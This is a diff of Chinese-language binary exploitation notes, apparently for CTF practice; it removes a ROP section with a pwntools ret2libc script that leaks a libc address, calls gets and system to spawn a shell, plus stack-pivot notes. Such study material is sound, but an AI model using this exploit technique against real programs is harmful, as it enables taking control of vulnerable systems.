@@ -137,50 +137,7 @@ linux 下
 - https://github.com/Neetx/Shellcode-Extractor
 从elf提取shellcode
 
-## ROP
- 1. ROPgadget 得到代码片断
- 2. cd80c3 就是int0x80;ret,s使用`ROPgadget --binary {binaryname} --opcode cd80c3`来寻找
- 3. 动态链接找不到 int 0x80,需要构造rop
-```py
-from pwn import *
-r=process('ret2lib')
 
-puts_got_plt = 0x804a01c
-puts_offset =0x00069930
-
-r.recvuntil(':')
-r.sendline(str(puts_got_plt))
-r.recvuntil(': ')
-libc_base=int(r.recvline(keepends=False),16)-puts_offset # get libc base address
-print hex(libc_base)
-gets_off=0x000690d0             # objdump -D libc |grep gets@
-system_off= 0x0003e8f0          # objdump -D libc |grep system@
-gets = libc_base+gets_off
-system = libc_base+system_off
-buf=0x804b000 -30               # cat /proc/702/maps to get writable address 
-rop=[
-        gets,
-        system,
-        buf,
-        buf
-        ]
-r.recvuntil(":")
-r.sendline('a'*60+flat(rop))
-r.sendline("/bin/sh\x00")
-r.interactive()
-
-```
-
-### 寄存器赋值
-构造栈结构
-```
-  *(pop eax ;ret)
-  3
-```
-将eax赋值为3
-### 栈转移
-寻找 leave;ret;指令，然后更改ebp的值即可
-leave= mov esp,ebp,pop ebp;
 
 ## return to Dynamic resolver
 return to lib without information leakage
